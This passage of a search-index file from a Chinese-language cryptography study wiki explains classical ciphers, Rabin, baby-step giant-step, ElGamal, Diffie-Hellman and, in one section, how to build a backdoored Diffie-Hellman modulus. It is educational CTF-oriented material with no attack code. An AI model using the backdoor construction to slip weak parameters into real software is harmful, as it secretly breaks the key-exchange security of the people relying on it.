Judge"},{"location":"security/crypto/classical/","text":"\u53e4\u5178\u5bc6\u78bc \u7dda\u4e0a\u5de5\u5177 cryptii quipqiup \u51f1\u85a9\u52a0\u5bc6 ( Caesar Cipher ) \u628a\u6bcf\u500b\u5b57\u6bcd\u90fd shift k \u4f4d k \u5c31\u662f\u5bc6\u9470 Vigen\u00e8re Cipher \u628a\u6bcf\u500b\u5b57\u6bcd\u90fd shift \u4e0d\u540c\u7684\u4f4d\u6578 \u8981 shift \u7684\u4f4d\u6578\u5c31\u662f\u5bc6\u9470 Hill Cipher \u5bc6\u9470\u662f\u4e00\u500b\u65b9\u77e9\u9663 \u628a\u660e\u6587\u548c\u5bc6\u9470\u505a\u77e9\u9663\u4e58\u6cd5\u5f97\u5230\u5bc6\u6587 (\u4e58\u6cd5\u548c\u52a0\u6cd5\u90fd\u662f % 26 \u6a21\u904b\u7b97) \u5bc6\u9470\u5fc5\u9700\u53ef\u9006 Xor Cipher \u5c07\u660e\u6587\u548c\u5bc6\u9470\u8f49\u6210 01 binary \u7684\u5f62\u5f0f \u660e\u6587\u548c\u5bc6\u9470\u505a xor \u7522\u751f\u5bc6\u6587 \u5bc6\u6587\u548c\u5bc6\u9470\u505a xor \u7522\u751f\u660e\u6587 \u66b4\u529b\u7834\u89e3 xor key \u7684\u5de5\u5177 : xortool \u624b\u6a5f\u9375\u76e4 Example: 21 = A 63 = O Bacon Cipher \u4e00\u63db\u4e00\u5f0f\u7684\u5bc6\u78bc \u53ea\u7528 A \u548c B \u8868\u793a wiki \u8c6c\u5708\u5bc6\u78bc \u4e00\u63db\u4e00\u5f0f\u7684\u5bc6\u78bc \u767e\u5ea6 \u7576\u92ea\u5bc6\u78bc \u770b\u4e2d\u6587\u5b57\u6709\u5e7e\u500b\u51fa\u982d\uff0c\u6578\u5b57\u5c31\u662f\u591a\u5c11 Example: \u4e95 = 8 \u5927 = 5 \u767e\u5ea6 \u67f5\u6b04\u5bc6\u78bc \u767e\u5ea6 \u66f4\u591a\u8cc7\u6e90 \u66f4\u591a\u901a\u9748\u4e4b\u8853","title":"\u53e4\u5178\u5bc6\u78bc"},{"location":"security/crypto/classical/#_1","text":"","title":"\u53e4\u5178\u5bc6\u78bc"},{"location":"security/crypto/classical/#_2","text":"cryptii quipqiup","title":"\u7dda\u4e0a\u5de5\u5177"},{"location":"security/crypto/classical/#caesar-cipher","text":"\u628a\u6bcf\u500b\u5b57\u6bcd\u90fd shift k \u4f4d k \u5c31\u662f\u5bc6\u9470","title":"\u51f1\u85a9\u52a0\u5bc6 ( Caesar Cipher )"},{"location":"security/crypto/classical/#vigenere-cipher","text":"\u628a\u6bcf\u500b\u5b57\u6bcd\u90fd shift \u4e0d\u540c\u7684\u4f4d\u6578 \u8981 shift \u7684\u4f4d\u6578\u5c31\u662f\u5bc6\u9470","title":"Vigen\u00e8re Cipher"},{"location":"security/crypto/classical/#hill-cipher","text":"\u5bc6\u9470\u662f\u4e00\u500b\u65b9\u77e9\u9663 \u628a\u660e\u6587\u548c\u5bc6\u9470\u505a\u77e9\u9663\u4e58\u6cd5\u5f97\u5230\u5bc6\u6587 (\u4e58\u6cd5\u548c\u52a0\u6cd5\u90fd\u662f % 26 \u6a21\u904b\u7b97) \u5bc6\u9470\u5fc5\u9700\u53ef\u9006","title":"Hill Cipher"},{"location":"security/crypto/classical/#xor-cipher","text":"\u5c07\u660e\u6587\u548c\u5bc6\u9470\u8f49\u6210 01 binary \u7684\u5f62\u5f0f \u660e\u6587\u548c\u5bc6\u9470\u505a xor \u7522\u751f\u5bc6\u6587 \u5bc6\u6587\u548c\u5bc6\u9470\u505a xor \u7522\u751f\u660e\u6587 \u66b4\u529b\u7834\u89e3 xor key \u7684\u5de5\u5177 : xortool","title":"Xor Cipher"},{"location":"security/crypto/classical/#_3","text":"Example: 21 = A 63 = O","title":"\u624b\u6a5f\u9375\u76e4"},{"location":"security/crypto/classical/#bacon-cipher","text":"\u4e00\u63db\u4e00\u5f0f\u7684\u5bc6\u78bc \u53ea\u7528 A \u548c B \u8868\u793a wiki","title":"Bacon Cipher"},{"location":"security/crypto/classical/#_4","text":"\u4e00\u63db\u4e00\u5f0f\u7684\u5bc6\u78bc \u767e\u5ea6","title":"\u8c6c\u5708\u5bc6\u78bc"},{"location":"security/crypto/classical/#_5","text":"\u770b\u4e2d\u6587\u5b57\u6709\u5e7e\u500b\u51fa\u982d\uff0c\u6578\u5b57\u5c31\u662f\u591a\u5c11 Example: \u4e95 = 8 \u5927 = 5 \u767e\u5ea6","title":"\u7576\u92ea\u5bc6\u78bc"},{"location":"security/crypto/classical/#_6","text":"\u767e\u5ea6","title":"\u67f5\u6b04\u5bc6\u78bc"},{"location":"security/crypto/classical/#_7","text":"\u66f4\u591a\u901a\u9748\u4e4b\u8853","title":"\u66f4\u591a\u8cc7\u6e90"},{"location":"security/crypto/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 Handbook of Applied Cryptography : \u5bc6\u78bc\u5b78\u8056\u7d93 MIT Open Course - Topics in Theoretical Computer Science Some Course Document SEAMS School 2015","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/resources/#_1","text":"Handbook of Applied Cryptography : \u5bc6\u78bc\u5b78\u8056\u7d93 MIT Open Course - Topics in Theoretical Computer Science Some Course Document SEAMS School 2015","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rabin/","text":"Rabin Rabin \u662f RSA \u5728 e = 2 e = 2 \u7684\u7279\u4f8b \u6211\u5011\u53ef\u4ee5\u767c\u73fe\u7576 RSA \u7684 e = 2 e = 2 \uff0c\u6211\u5011\u53ef\u4ee5\u6b63\u5e38\u52a0\u5bc6\uff0c\u4f46\u6c92\u8fa6\u6cd5\u6b63\u5e38\u89e3\u5bc6 \u56e0\u70ba (p-1)(q-1) (p-1)(q-1) \u6703\u662f\u5076\u6578\uff0c\u800c gcd(e, (p-1)(q-1)) \\ne 1 gcd(e, (p-1)(q-1)) \\ne 1 \uff0c\u7121\u6cd5\u8a08\u7b97\u6a21\u53cd\u5143\u7d20 d d \u6240\u4ee5\u5fc5\u9808\u53e6\u5916\u60f3\u65b9\u6cd5\u89e3\u5bc6\uff0c\u800c\u9019\u500b\u7279\u4f8b\u5c31\u662f Rabin \u7522\u751f\u5bc6\u9470 \u9078\u5169\u500b\u8cea\u6578 p p and q q ( p \\ne q p \\ne q ) N = p \\times q N = p \\times q \u516c\u9470\u662f N N \uff0c\u79c1\u9470\u662f (p, q) (p, q) \u52a0\u5bc6 \u660e\u6587 m m \uff0c\u5bc6\u6587 c c m^2 \\equiv c \\pmod{N} m^2 \\equiv c \\pmod{N} \u89e3\u5bc6 \\sqrt{c} \\equiv \\pm m_p \\pmod{p} \\sqrt{c} \\equiv \\pm m_p \\pmod{p} \\sqrt{c} \\equiv \\pm m_q \\pmod{q} \\sqrt{c} \\equiv \\pm m_q \\pmod{q} \u4f7f\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u8a08\u7b97\u5728\u6a21 N = pq N = pq \u4e0b\u7684\u89e3 \u6709\u56db\u7d44\u89e3 + m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N \u6a21\u958b\u65b9\u6839 \u7576 p \\equiv q \\equiv 3 \\pmod{4} p \\equiv q \\equiv 3 \\pmod{4} m_p \\equiv c^{\\frac{1}{4}(p+1)} \\pmod{p} m_p \\equiv c^{\\frac{1}{4}(p+1)} \\pmod{p} m_q \\equiv c^{\\frac{1}{4}(q+1)} \\pmod{q} m_q \\equiv c^{\\frac{1}{4}(q+1)} \\pmod{q} \u800c\u4e00\u822c\u60c5\u6cc1\u4e0b\uff0c\u5247\u4f7f\u7528 Tonelli-Shanks Algorithm ( \u770b\u770b\u9019\u500b blog \u6216\u9019\u7bc7 Square Roots from 1;24,51,10 to Dan Shanks ) CTF \u984c\u76ee HITCON CTF 2015 Quals - Rsabin","title":"Rabin"},{"location":"security/crypto/asymmetric/rabin/#rabin","text":"Rabin \u662f RSA \u5728 e = 2 e = 2 \u7684\u7279\u4f8b \u6211\u5011\u53ef\u4ee5\u767c\u73fe\u7576 RSA \u7684 e = 2 e = 2 \uff0c\u6211\u5011\u53ef\u4ee5\u6b63\u5e38\u52a0\u5bc6\uff0c\u4f46\u6c92\u8fa6\u6cd5\u6b63\u5e38\u89e3\u5bc6 \u56e0\u70ba (p-1)(q-1) (p-1)(q-1) \u6703\u662f\u5076\u6578\uff0c\u800c gcd(e, (p-1)(q-1)) \\ne 1 gcd(e, (p-1)(q-1)) \\ne 1 \uff0c\u7121\u6cd5\u8a08\u7b97\u6a21\u53cd\u5143\u7d20 d d \u6240\u4ee5\u5fc5\u9808\u53e6\u5916\u60f3\u65b9\u6cd5\u89e3\u5bc6\uff0c\u800c\u9019\u500b\u7279\u4f8b\u5c31\u662f Rabin","title":"Rabin"},{"location":"security/crypto/asymmetric/rabin/#_1","text":"\u9078\u5169\u500b\u8cea\u6578 p p and q q ( p \\ne q p \\ne q ) N = p \\times q N = p \\times q \u516c\u9470\u662f N N \uff0c\u79c1\u9470\u662f (p, q) (p, q)","title":"\u7522\u751f\u5bc6\u9470"},{"location":"security/crypto/asymmetric/rabin/#_2","text":"\u660e\u6587 m m \uff0c\u5bc6\u6587 c c m^2 \\equiv c \\pmod{N} m^2 \\equiv c \\pmod{N}","title":"\u52a0\u5bc6"},{"location":"security/crypto/asymmetric/rabin/#_3","text":"\\sqrt{c} \\equiv \\pm m_p \\pmod{p} \\sqrt{c} \\equiv \\pm m_p \\pmod{p} \\sqrt{c} \\equiv \\pm m_q \\pmod{q} \\sqrt{c} \\equiv \\pm m_q \\pmod{q} \u4f7f\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u8a08\u7b97\u5728\u6a21 N = pq N = pq \u4e0b\u7684\u89e3 \u6709\u56db\u7d44\u89e3 + m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N + m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q + m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N - m_p \\cdot q \\cdot y_q - m_q \\cdot p \\cdot y_p \\mod N","title":"\u89e3\u5bc6"},{"location":"security/crypto/asymmetric/rabin/#_4","text":"\u7576 p \\equiv q \\equiv 3 \\pmod{4} p \\equiv q \\equiv 3 \\pmod{4} m_p \\equiv c^{\\frac{1}{4}(p+1)} \\pmod{p} m_p \\equiv c^{\\frac{1}{4}(p+1)} \\pmod{p} m_q \\equiv c^{\\frac{1}{4}(q+1)} \\pmod{q} m_q \\equiv c^{\\frac{1}{4}(q+1)} \\pmod{q} \u800c\u4e00\u822c\u60c5\u6cc1\u4e0b\uff0c\u5247\u4f7f\u7528 Tonelli-Shanks Algorithm ( \u770b\u770b\u9019\u500b blog \u6216\u9019\u7bc7 Square Roots from 1;24,51,10 to Dan Shanks )","title":"\u6a21\u958b\u65b9\u6839"},{"location":"security/crypto/asymmetric/rabin/#ctf","text":"HITCON CTF 2015 Quals - Rsabin","title":"CTF \u984c\u76ee"},{"location":"security/crypto/asymmetric/diffie-hellman/baby-step-giant-step/","text":"Baby-Step Giant-Step \u7528\u4f86\u89e3 Discrete Logarithm Problem \u9019\u908a\u70ba\u89e3\u91cb\u65b9\u4fbf\u5047\u8a2d n n \u70ba\u5b8c\u5168\u5e73\u65b9\u6578 \u6211\u5011\u77e5\u9053\u6700\u66b4\u529b\u7684\u65b9\u6cd5\u5c31\u662f\u679a\u8209 \\alpha^{1}, \\alpha^{2}, ... \\alpha^{1}, \\alpha^{2}, ... \u76f4\u5230 \\alpha^x = \\beta \\alpha^x = \\beta \uff0c\u6642\u9593\u8907\u96dc\u5ea6 O(n) O(n) \u90a3\u6211\u5011\u628a\u8981\u679a\u8209\u7684 0, 1, ..., n-1 0, 1, ..., n-1 \u5207\u6210 \\sqrt{n} \\sqrt{n} \u500b\u5340\u584a\uff0c\u6bcf\u500b\u5340\u584a\u6709 \\sqrt{n} \\sqrt{n} \u500b\u5143\u7d20 \u5047\u8a2d\u73fe\u5728\u5617\u8a66\u7684\u662f\u7b2c i i \u500b\u5340\u584a\u7684\u7b2c j j \u500b\u5143\u7d20\uff0c\u4e5f\u5c31\u662f x = i\\sqrt{n} + j x = i\\sqrt{n} + j \\begin{align} &\\alpha^x = \\beta \\\\ &\\alpha^{i\\sqrt{n} + j} = \\beta \\\\ &\\alpha^{i\\sqrt{n}} \\cdot \\alpha^{j} = \\beta \\\\ &\\alpha^j = \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\end{align} \\begin{align} &\\alpha^x = \\beta \\\\ &\\alpha^{i\\sqrt{n} + j} = \\beta \\\\ &\\alpha^{i\\sqrt{n}} \\cdot \\alpha^{j} = \\beta \\\\ &\\alpha^j = \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\end{align} \u5f9e j = 0, 1, ..., \\sqrt{n} - 1 j = 0, 1, ..., \\sqrt{n} - 1 \u8a08\u7b97 \\alpha^j \\alpha^j \u5efa\u8868 \u5f9e i = 0, 1, ..., \\sqrt{n} - 1 i = 0, 1, ..., \\sqrt{n} - 1 \u8a08\u7b97 \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\beta \\cdot \\alpha^{-i\\sqrt{n}} \uff0c\u518d\u53bb\u67e5\u8868\u5c31\u597d \u8907\u96dc\u5ea6 \u6642\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n}) \u7a7a\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n})","title":"Big-Step Giant-Step"},{"location":"security/crypto/asymmetric/diffie-hellman/baby-step-giant-step/#baby-step-giant-step","text":"\u7528\u4f86\u89e3 Discrete Logarithm Problem \u9019\u908a\u70ba\u89e3\u91cb\u65b9\u4fbf\u5047\u8a2d n n \u70ba\u5b8c\u5168\u5e73\u65b9\u6578 \u6211\u5011\u77e5\u9053\u6700\u66b4\u529b\u7684\u65b9\u6cd5\u5c31\u662f\u679a\u8209 \\alpha^{1}, \\alpha^{2}, ... \\alpha^{1}, \\alpha^{2}, ... \u76f4\u5230 \\alpha^x = \\beta \\alpha^x = \\beta \uff0c\u6642\u9593\u8907\u96dc\u5ea6 O(n) O(n) \u90a3\u6211\u5011\u628a\u8981\u679a\u8209\u7684 0, 1, ..., n-1 0, 1, ..., n-1 \u5207\u6210 \\sqrt{n} \\sqrt{n} \u500b\u5340\u584a\uff0c\u6bcf\u500b\u5340\u584a\u6709 \\sqrt{n} \\sqrt{n} \u500b\u5143\u7d20 \u5047\u8a2d\u73fe\u5728\u5617\u8a66\u7684\u662f\u7b2c i i \u500b\u5340\u584a\u7684\u7b2c j j \u500b\u5143\u7d20\uff0c\u4e5f\u5c31\u662f x = i\\sqrt{n} + j x = i\\sqrt{n} + j \\begin{align} &\\alpha^x = \\beta \\\\ &\\alpha^{i\\sqrt{n} + j} = \\beta \\\\ &\\alpha^{i\\sqrt{n}} \\cdot \\alpha^{j} = \\beta \\\\ &\\alpha^j = \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\end{align} \\begin{align} &\\alpha^x = \\beta \\\\ &\\alpha^{i\\sqrt{n} + j} = \\beta \\\\ &\\alpha^{i\\sqrt{n}} \\cdot \\alpha^{j} = \\beta \\\\ &\\alpha^j = \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\end{align} \u5f9e j = 0, 1, ..., \\sqrt{n} - 1 j = 0, 1, ..., \\sqrt{n} - 1 \u8a08\u7b97 \\alpha^j \\alpha^j \u5efa\u8868 \u5f9e i = 0, 1, ..., \\sqrt{n} - 1 i = 0, 1, ..., \\sqrt{n} - 1 \u8a08\u7b97 \\beta \\cdot \\alpha^{-i\\sqrt{n}} \\beta \\cdot \\alpha^{-i\\sqrt{n}} \uff0c\u518d\u53bb\u67e5\u8868\u5c31\u597d","title":"Baby-Step Giant-Step"},{"location":"security/crypto/asymmetric/diffie-hellman/baby-step-giant-step/#_1","text":"\u6642\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n}) \u7a7a\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n})","title":"\u8907\u96dc\u5ea6"},{"location":"security/crypto/asymmetric/diffie-hellman/backdoor/","text":"Backdoor in Diffie Hellman Backdoor I \u6211\u5011\u4e0d\u518d\u662f\u9078\u4e00\u500b\u8cea\u6578 p p \u800c\u662f\u9078\u5169\u500b\u8cea\u6578\u4e58\u8d77\u4f86 n = pq n = pq DLP \u8b8a\u6210\u662f\u6c42 x x \u6eff\u8db3 \\alpha^x \\equiv \\beta \\pmod{n} \\alpha^x \\equiv \\beta \\pmod{n} \u53e6 \\beta \\mod{p} = \\beta_p \\beta \\mod{p} = \\beta_p \u548c \\beta \\mod{q} = \\beta_q \\beta \\mod{q} = \\beta_q \\alpha^x \\equiv \\beta_p \\pmod{p} \\alpha^x \\equiv \\beta_p \\pmod{p} \u89e3\u51fa x \\equiv x_p \\pmod{p - 1} x \\equiv x_p \\pmod{p - 1} \\alpha^x \\equiv \\beta_q \\pmod{q} \\alpha^x \\equiv \\beta_q \\pmod{q} \u89e3\u51fa x \\equiv x_q \\pmod{q - 1} x \\equiv x_q \\pmod{q - 1} \u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u6c42\u51fa x x \u4f46\u662f\u6211\u5011\u9084\u662f\u9700\u8981\u6c42 order \u662f p - 1 p - 1 \u548c q - 1 q - 1 \u7684 DLP\uff0c\u53ef\u4ee5\u518d\u66f4\u6709\u6548\u7387\u4e00\u9ede \u9078 p - 1 = 2p_1p_2 p - 1 = 2p_1p_2 \u548c q - 1 = 2q_1q_2 q - 1 = 2q_1q_2 p_1, q_1 p_1, q_1 \u662f\u5f88\u5c0f\u7684\u8cea\u6578\uff0c p_2, q_2 p_2, q_2 \u662f\u5f88\u5927\u7684\u8cea\u6578 \u6211\u5011\u53ef\u4ee5\u627e\u5230 g_p g_p \u5728 \\mathbb{Z}_p \\mathbb{Z}_p \u4e0b\u7684 order \u662f p_1 p_1 \u548c g_q g_q \u5728 \\mathbb{Z}_q \\mathbb{Z}_q \u4e0b\u7684 order \u662f q_1 q_1 \u7136\u5f8c\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u628a g_p, g_q g_p, g_q \u7d44\u6210 g g \u5728 \\mathbb{Z}_n \\mathbb{Z}_n \u4e0b Backdoor II \u9078 n = pq n = pq \uff0c\u4f7f\u5f97 (p - 1) \u548c (q - 1) \u90fd\u662f B-smooth \u9019\u6a23\u53ea\u6709\u80fd\u5206\u89e3 n = pq n = pq \u7684\u4eba\u53ef\u4ee5\u7528 (p - 1), (q - 1) (p - 1), (q - 1) \u7684\u5c0f\u8cea\u6578\u5011\u505a Pohlig Hellman \u4f46\u662f\u9019\u6a23\u53ef\u4ee5\u76f4\u63a5\u7528 Pollard's p - 1 Algorithm \u5206\u89e3 n n \u6240\u4ee5\u6211\u5011\u8981\u653e p_{big}, q_{big} p_{big}, q_{big} \u7a0d\u5fae\u6709\u9ede\u5927\u7684\u8cea\u6578\u5728 (p - 1) \u548c (q - 1) \u88e1\u9762 \u76f8\u95dc\u8cc7\u6e90 How to Backdoor Diffie-Hellman https://www.cryptologie.net/article/360/how-to-backdoor-diffie-hellman-quick-explanation/","title":"Backdoor in Diffie-Hellman"},{"location":"security/crypto/asymmetric/diffie-hellman/backdoor/#backdoor-in-diffie-hellman","text":"","title":"Backdoor in Diffie Hellman"},{"location":"security/crypto/asymmetric/diffie-hellman/backdoor/#backdoor-i","text":"\u6211\u5011\u4e0d\u518d\u662f\u9078\u4e00\u500b\u8cea\u6578 p p \u800c\u662f\u9078\u5169\u500b\u8cea\u6578\u4e58\u8d77\u4f86 n = pq n = pq DLP \u8b8a\u6210\u662f\u6c42 x x \u6eff\u8db3 \\alpha^x \\equiv \\beta \\pmod{n} \\alpha^x \\equiv \\beta \\pmod{n} \u53e6 \\beta \\mod{p} = \\beta_p \\beta \\mod{p} = \\beta_p \u548c \\beta \\mod{q} = \\beta_q \\beta \\mod{q} = \\beta_q \\alpha^x \\equiv \\beta_p \\pmod{p} \\alpha^x \\equiv \\beta_p \\pmod{p} \u89e3\u51fa x \\equiv x_p \\pmod{p - 1} x \\equiv x_p \\pmod{p - 1} \\alpha^x \\equiv \\beta_q \\pmod{q} \\alpha^x \\equiv \\beta_q \\pmod{q} \u89e3\u51fa x \\equiv x_q \\pmod{q - 1} x \\equiv x_q \\pmod{q - 1} \u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u6c42\u51fa x x \u4f46\u662f\u6211\u5011\u9084\u662f\u9700\u8981\u6c42 order \u662f p - 1 p - 1 \u548c q - 1 q - 1 \u7684 DLP\uff0c\u53ef\u4ee5\u518d\u66f4\u6709\u6548\u7387\u4e00\u9ede \u9078 p - 1 = 2p_1p_2 p - 1 = 2p_1p_2 \u548c q - 1 = 2q_1q_2 q - 1 = 2q_1q_2 p_1, q_1 p_1, q_1 \u662f\u5f88\u5c0f\u7684\u8cea\u6578\uff0c p_2, q_2 p_2, q_2 \u662f\u5f88\u5927\u7684\u8cea\u6578 \u6211\u5011\u53ef\u4ee5\u627e\u5230 g_p g_p \u5728 \\mathbb{Z}_p \\mathbb{Z}_p \u4e0b\u7684 order \u662f p_1 p_1 \u548c g_q g_q \u5728 \\mathbb{Z}_q \\mathbb{Z}_q \u4e0b\u7684 order \u662f q_1 q_1 \u7136\u5f8c\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u628a g_p, g_q g_p, g_q \u7d44\u6210 g g \u5728 \\mathbb{Z}_n \\mathbb{Z}_n \u4e0b","title":"Backdoor I"},{"location":"security/crypto/asymmetric/diffie-hellman/backdoor/#backdoor-ii","text":"\u9078 n = pq n = pq \uff0c\u4f7f\u5f97 (p - 1) \u548c (q - 1) \u90fd\u662f B-smooth \u9019\u6a23\u53ea\u6709\u80fd\u5206\u89e3 n = pq n = pq \u7684\u4eba\u53ef\u4ee5\u7528 (p - 1), (q - 1) (p - 1), (q - 1) \u7684\u5c0f\u8cea\u6578\u5011\u505a Pohlig Hellman \u4f46\u662f\u9019\u6a23\u53ef\u4ee5\u76f4\u63a5\u7528 Pollard's p - 1 Algorithm \u5206\u89e3 n n \u6240\u4ee5\u6211\u5011\u8981\u653e p_{big}, q_{big} p_{big}, q_{big} \u7a0d\u5fae\u6709\u9ede\u5927\u7684\u8cea\u6578\u5728 (p - 1) \u548c (q - 1) \u88e1\u9762","title":"Backdoor II"},{"location":"security/crypto/asymmetric/diffie-hellman/backdoor/#_1","text":"How to Backdoor Diffie-Hellman https://www.cryptologie.net/article/360/how-to-backdoor-diffie-hellman-quick-explanation/","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/diffie-hellman/elgamal/","text":"ElGamal \u4f7f\u7528 Diffie Hellman \u4ea4\u63db key \u5047\u8a2d key \u662f g^{ab} g^{ab} \u52a0\u5bc6 c = m \\cdot g^{ab} c = m \\cdot g^{ab} \u89e3\u5bc6 m = c \\cdot (g^{ab})^{-1} m = c \\cdot (g^{ab})^{-1}","title":"ElGamal"},{"location":"security/crypto/asymmetric/diffie-hellman/elgamal/#elgamal","text":"\u4f7f\u7528 Diffie Hellman \u4ea4\u63db key \u5047\u8a2d key \u662f g^{ab} g^{ab}","title":"ElGamal"},{"location":"security/crypto/asymmetric/diffie-hellman/elgamal/#_1","text":"c = m \\cdot g^{ab} c = m \\cdot g^{ab}","title":"\u52a0\u5bc6"},{"location":"security/crypto/asymmetric/diffie-hellman/elgamal/#_2","text":"m = c \\cdot (g^{ab})^{-1} m = c \\cdot (g^{ab})^{-1}","title":"\u89e3\u5bc6"},{"location":"security/crypto/asymmetric/diffie-hellman/introduction/","text":"Introduction to Diffie-Hellman Diffie-Hellman Key Exchange \u53ef\u4ee5\u5728\u96d9\u65b9\u6c92\u6709\u4efb\u4f55\u5171\u901a\u8cc7\u8a0a\u7684\u60c5\u6cc1\u4e0b\uff0c\u5728\u4e0d\u5b89\u5168\u7684\u901a\u9053\u4e2d\u5171\u4eab\u7955\u5bc6 \u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b\u8cea\u6578 p p \u548c\u4e00\u500b\u6574\u6578 g g Alice \u548c Bob \u60f3\u8981\u5171\u4eab\u7955\u5bc6 Alice \u96a8\u6a5f\u7522\u751f a a \uff0cBob \u96a8\u6a5f\u7522\u751f b b Alice \u8a08\u7b97 g^a\\ \\text{mod}\\ p g^a\\ \\text{mod}\\ p \uff0c\u50b3\u9001\u7d66 Bob Bob \u8a08\u7b97 g^b\\ \\text{mod}\\ p g^b\\ \\text{mod}\\ p \uff0c\u50b3\u9001\u7d66 Alice Alice \u8a08\u7b97 (g^b\\ \\text{mod}\\ p)^a\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p (g^b\\ \\text{mod}\\ p)^a\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p Bob \u8a08\u7b97 (g^a\\ \\text{mod}\\ p)^b\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p (g^a\\ \\text{mod}\\ p)^b\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p Alice \u548c Bob \u5171\u4eab\u7955\u5bc6 g^{ab}\\ \\text{mod}\\ p g^{ab}\\ \\text{mod}\\ p Diffie-Hellman Key Exchange \u80fd\u9632\u6b62 \u7aca\u807d \u4f46\u4e0d\u80fd\u9632\u6b62 \u4e2d\u9593\u4eba\u653b\u64ca Discrete Logarithm Problem Diffie Hellman \u7834\u89e3\u7684\u56f0\u96e3\u9ede\u5728\u65bc Discrete Logarithm Problem \u6c92\u6709\u6709\u6548\u7684\u65b9\u5f0f\u6c42\u89e3 Discrete Logarithm Problem : \u7d66\u4e00\u8cea\u6578 p p \uff0c\u4e00\u500b\u751f\u6210\u5143 \\alpha \\in \\mathbb{Z}_p^{*} \\alpha \\in \\mathbb{Z}_p^{*} \uff0c\u4e00\u500b\u5143\u7d20 \\beta \\in \\mathbb{Z}_p^{*} \\beta \\in \\mathbb{Z}_p^{*} ( \\mathbb{Z}_p^{*} \\mathbb{Z}_p^{*} has order n n ) \u6c42 x x \u6eff\u8db3 \\alpha^{x} \\equiv \\beta \\pmod{p} \\alpha^{x} \\equiv \\beta \\pmod{p}","title":"Introduction to Diffie-Hellman"},{"location":"security/crypto/asymmetric/diffie-hellman/introduction/#introduction-to-diffie-hellman","text":"Diffie-Hellman Key Exchange \u53ef\u4ee5\u5728\u96d9\u65b9\u6c92\u6709\u4efb\u4f55\u5171\u901a\u8cc7\u8a0a\u7684\u60c5\u6cc1\u4e0b\uff0c\u5728\u4e0d\u5b89\u5168\u7684\u901a\u9053\u4e2d\u5171\u4eab\u7955\u5bc6 \u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b\u8cea\u6578 p p \u548c\u4e00\u500b\u6574\u6578 g g Alice \u548c Bob \u60f3\u8981\u5171\u4eab\u7955\u5bc6 Alice \u96a8\u6a5f\u7522\u751f a a \uff0cBob \u96a8\u6a5f\u7522\u751f b b Alice \u8a08\u7b97 g^a\\ \\text{mod}\\ p g^a\\ \\text{mod}\\ p \uff0c\u50b3\u9001\u7d66 Bob Bob \u8a08\u7b97 g^b\\ \\text{mod}\\ p g^b\\ \\text{mod}\\ p \uff0c\u50b3\u9001\u7d66 Alice Alice \u8a08\u7b97 (g^b\\ \\text{mod}\\ p)^a\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p (g^b\\ \\text{mod}\\ p)^a\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p Bob \u8a08\u7b97 (g^a\\ \\text{mod}\\ p)^b\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p (g^a\\ \\text{mod}\\ p)^b\\ \\text{mod}\\ p = g^{ab}\\ \\text{mod}\\ p Alice \u548c Bob \u5171\u4eab\u7955\u5bc6 g^{ab}\\ \\text{mod}\\ p g^{ab}\\ \\text{mod}\\ p Diffie-Hellman Key Exchange \u80fd\u9632\u6b62 \u7aca\u807d \u4f46\u4e0d\u80fd\u9632\u6b62 \u4e2d\u9593\u4eba\u653b\u64ca","title":"Introduction to Diffie-Hellman"},{"location":"security/crypto/asymmetric/diffie-hellman/introduction/#discrete-logarithm-problem","text":"Diffie Hellman \u7834\u89e3\u7684\u56f0\u96e3\u9ede\u5728\u65bc Discrete Logarithm Problem \u6c92\u6709\u6709\u6548\u7684\u65b9\u5f0f\u6c42\u89e3 Discrete Logarithm Problem : \u7d66\u4e00\u8cea\u6578 p p \uff0c\u4e00\u500b\u751f\u6210\u5143 \\alpha \\in \\mathbb{Z}_p^{*} \\alpha \\in \\mathbb{Z}_p^{*} 